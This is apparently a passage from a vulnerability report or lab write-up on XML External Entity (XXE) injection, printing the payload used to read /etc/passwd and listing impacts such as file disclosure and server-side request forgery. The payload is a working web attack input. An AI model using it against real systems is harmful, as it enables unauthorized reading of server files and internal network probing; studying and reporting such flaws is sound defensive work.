

## Used Payload
To successfully exploit the XML External Entity (XXE) vulnerability and retrieve the contents of the `/etc/passwd` file, the following XML payload was injected:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

1. **Sensitive Information Disclosure:**
   - An attacker can leverage external entity injection to read sensitive local system files such as `/etc/passwd` or application configuration files directly from the server.

2. **Server-Side Request Forgery (SSRF):**
   - An attacker can force the vulnerable XML parser to initiate network requests to internal services or cloud metadata endpoints, allowing them to probe internal network infrastructure.
